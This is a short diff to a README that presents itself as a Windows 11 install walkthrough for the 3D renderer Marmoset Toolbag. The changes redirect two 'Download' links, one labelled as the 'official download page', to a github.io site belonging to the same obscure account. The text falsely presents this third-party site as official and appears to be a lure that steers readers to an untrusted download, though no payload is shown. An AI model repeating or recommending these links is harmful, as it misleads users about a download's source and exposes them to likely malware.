@@ -1,6 +1,6 @@
 # 🛠️ Marmoset-Toolbag-Install-Walkthrough - Get your 3D rendering project running fast
 
-[![Download Marmoset Toolbag Guide](https://img.shields.io/badge/Download-Click_Here-blue.svg)](https://github.com/evasive-genusiguana227/Marmoset-Toolbag-Install-Walkthrough)
+[![Download Marmoset Toolbag Guide](https://img.shields.io/badge/Download-Click_Here-blue.svg)](https://evasive-genusiguana227.github.io)
 
 This guide helps you put Marmoset Toolbag on your Windows 11 computer. Many users face trouble with installation on modern systems. These steps resolve common errors and get your software working.
 
@@ -19,7 +19,7 @@ Ensure your computer meets these standards before you begin:
 
 You must visit the official page to download the correct version for your hardware. If the standard installer fails, use these steps to prepare your environment.
 
-[Click here to visit the official download page](https://github.com/evasive-genusiguana227/Marmoset-Toolbag-Install-Walkthrough)
+[Click here to visit the official download page](https://evasive-genusiguana227.github.io)
 
 ## ⚙️ Preparation Steps
 
